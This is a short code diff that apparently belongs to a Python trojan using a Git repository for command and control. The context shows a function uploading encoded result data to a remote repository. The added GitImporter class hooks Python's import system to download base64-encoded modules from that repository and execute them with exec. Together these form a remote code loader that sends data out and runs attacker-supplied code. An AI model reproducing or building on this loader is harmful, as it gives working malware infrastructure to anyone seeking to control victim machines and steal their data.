@@ -75,3 +75,34 @@ def store_module_result(data):
     repo.create_file(remote_path, 'Confirmation message', base64.b64encode(data))
 
     return
+
+
+class GitImporter(object):
+    
+    def __init__(self):
+
+        self.current_module_code = ''
+
+    def find_module(self, fullname, path=None):
+
+        if configured:
+
+            print('[*] Attempting to download %s' % fullname)
+
+            new_library = get_file_contents('modules/%s' % fullname)
+
+            if new_library is not None:
+
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+
+        return None
+
+    def load_module(self, name):
+
+        module = imp.new_module(name)
+
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+
+        return module
